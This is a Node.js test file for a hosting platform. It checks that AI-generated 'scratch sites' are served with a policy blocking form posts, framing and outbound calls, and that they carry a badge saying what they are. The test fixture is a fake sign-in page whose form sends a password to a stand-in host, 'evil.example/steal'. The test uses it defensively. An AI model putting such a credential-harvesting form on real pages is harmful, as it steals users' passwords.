'use strict';
/**
 * Agent Streams S6 — a scratch site is served so it cannot collect anything and cannot hide what it is.
 *
 * A scratch site is a page an AI made from a viewer's chat request, shown on stream at an openvibe.space
 * address. It may collect nothing: no form may be submitted (form-action 'none'), it may not be framed
 * (frame-ancestors 'none'), it may not phone home (connect-src 'none'), and it is never indexed. The badge
 * that says what it is lives in a wrapper document above the page, so the page cannot take it away.
 */
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { testDb } = require('./helpers/db');
const { createApp } = require('../server/app');
const { load } = require('../server/hosting-config');

(async () => {
    const db = await testDb();
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ov-space-scratch-'));
    const auth = { verify: async () => null, keys: { loaded: () => false } };
    const config = load({ NODE_ENV: 'test', BASE_URL: 'https://openvibe.space', SPACE_WORKER: 'off', SPACE_MIN_FREE_BYTES: '0' });
    const app = await createApp({ db, auth, hostingConfig: config, storageDir: dir });
    const h = app.locals.hosting;
    const user = { kind: 'user', subject: 'usr_01J8ZQ4Y7N3M2K1H0G9F8E7D6C', staff: true };
    const project = await h.projects.create(user, { name: 'Scratch' });
    const site = await h.sites.create(user, project, { name: 'snake-4f2a' });
    const pre = await h.deploys.precheck(user, site.id);
    await h.deploys.create(user, pre, [{
        path: 'index.html',
        data: Buffer.from('<!doctype html><html><body><h1>Sign in</h1>'
            + '<form action="https://evil.example/steal" method="post"><input name="password"><button>Log in</button></form>'
            + '</body></html>'),
    }], { source: 'files', activate: true });

    const store = (app.locals.ctx && app.locals.ctx.store) || h.store;
    const scratch = require('../server/scratch-sites').createScratchSites({ store, config });
    const marked = await scratch.mark(site.id);
    assert.strictEqual(marked.ok, true, 'the site is a scratch site');

    const tenant = h.tenant;
    const server = http.createServer(async (req, res) => {
        const found = await tenant.resolve(String(req.headers.host || ''));
        if (found.kind !== 'site') { res.statusCode = 404; return res.end('unknown host'); }
        return tenant.handle(req, res, found.site);
    });
    await new Promise((ok) => server.listen(0, '127.0.0.1', ok));
    const port = server.address().port;
    // The Host header names the site (the fetch API forbids setting it, so the request is made by hand).
    const ask = (host, path = '/') => new Promise((ok, no) => {
        const req = http.request({ host: '127.0.0.1', port, path, method: 'GET', headers: { host } }, (res) => {
            let body = '';
            res.setEncoding('utf8');
            res.on('data', (c) => { body += c; });
            res.on('end', () => ok({ status: res.statusCode, headers: res.headers, body }));
        });
        req.on('error', no);
        req.end();
    });
    const answer = await ask('snake-4f2a.openvibe.website');
    const body = answer.body;
    const csp = String(answer.headers['content-security-policy'] || '');
    const robots = String(answer.headers['x-robots-tag'] || '');

    // The policy: no form may be submitted, the page may not be framed, it may not phone home.
    assert.ok(csp.includes("form-action 'none'"), 'a form POST is blocked by the policy: ' + csp);
    assert.ok(csp.includes("frame-ancestors 'none'"), 'the page may not be framed: ' + csp);
    assert.ok(csp.includes("connect-src 'none'"), 'the page may not phone home: ' + csp);
    assert.ok(robots.includes('noindex'), 'it is never indexed: ' + robots);

    // The badge is there, and it is above the page's own markup, which lives inside a sandboxed frame.
    assert.ok(body.includes('A throwaway page an AI made from a chat request'), 'the badge says what the page is');
    assert.ok(body.includes('removed'), 'the badge says when the page goes');
    assert.ok(body.includes('id="ov-scratch-badge"'), 'the badge is its own element');
    assert.ok(body.includes('sandbox="allow-scripts"'), 'the page runs in a sandboxed frame');
    assert.ok(!body.includes('allow-same-origin'), 'the frame is not the page\'s origin: the page cannot reach the badge');
    const badgeAt = body.indexOf('ov-scratch-badge');
    const frameAt = body.indexOf('<iframe');
    assert.ok(badgeAt > 0 && badgeAt < frameAt, 'the badge is above the page, not inside it');
    assert.ok(body.includes('&lt;form'), 'the page\'s own markup is escaped inside the frame');

    // A site that is not a scratch site is served as it is.
    const plain = await h.sites.create(user, project, { name: 'ordinary-site' });
    const pre2 = await h.deploys.precheck(user, plain.id);
    await h.deploys.create(user, pre2, [{ path: 'index.html', data: Buffer.from('<h1>Ordinary</h1>') }], { source: 'files', activate: true });
    const answer2 = await ask('ordinary-site.openvibe.website');
    const body2 = answer2.body;
    assert.ok(body2.includes('<h1>Ordinary</h1>'), 'an ordinary site is served as it is');
    assert.ok(!body2.includes('ov-scratch-badge'), 'an ordinary site has no badge');

    server.close();
    console.log('scratch sites: a page an AI made collects nothing, and says what it is');
    await db.close();
    process.exit(0);
})().catch((err) => { console.error(err); process.exit(1); });
